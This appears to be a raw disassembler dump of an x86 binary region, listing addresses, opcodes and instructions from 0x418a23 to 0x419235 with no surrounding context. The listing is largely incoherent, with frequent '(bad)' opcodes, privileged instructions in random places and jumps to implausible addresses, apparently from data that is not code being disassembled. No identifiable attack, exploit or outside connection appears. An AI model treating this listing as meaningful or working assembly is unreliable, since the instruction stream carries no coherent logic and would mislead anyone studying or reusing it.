  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
